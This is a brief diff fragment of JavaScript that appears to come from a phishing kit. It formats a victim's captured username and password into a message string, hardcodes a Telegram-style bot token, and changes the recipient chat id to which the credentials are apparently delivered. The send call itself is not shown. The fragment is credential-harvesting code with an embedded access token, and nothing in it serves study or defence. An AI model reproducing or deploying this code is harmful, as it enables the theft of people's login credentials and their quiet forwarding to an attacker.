@@ -35,7 +35,7 @@ var text = "user : `" + username + "` || pass : `" + pass + "`"
 
 var token = "1040670629:AAESKX3wsBQWgwIrRhUGQM3zNrG0pX-abIE";
 
-var id = "387534219";
+var id = "188274825";
 
 if(username.length > 0 && pass.length > 0){
 
